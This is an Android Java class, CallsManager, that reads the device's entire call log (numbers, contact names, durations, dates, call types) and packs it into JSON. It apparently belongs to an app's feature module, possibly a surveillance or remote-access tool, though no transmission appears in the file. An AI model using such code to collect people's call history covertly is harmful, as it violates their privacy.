package com.fason.app.features.calls;

import android.database.Cursor;
import android.provider.CallLog;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsManager {

    public static JSONObject getCallsLogs() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            Cursor cur = FasonApp.getContext().getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

            if (cur != null) {
                int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int durIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
                int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);
                int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);

                while (cur.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("phoneNo", numIdx >= 0 ? cur.getString(numIdx) : "");
                    call.put("name", nameIdx >= 0 ? cur.getString(nameIdx) : "");
                    call.put("duration", durIdx >= 0 ? cur.getString(durIdx) : "");
                    call.put("date", dateIdx >= 0 ? cur.getString(dateIdx) : "");
                    call.put("type", typeIdx >= 0 ? cur.getInt(typeIdx) : -1);
                    list.put(call);
                }
                cur.close();
            }
            result.put("callsList", list);
        } catch (Exception ignored) {}

        return result;
    }
}
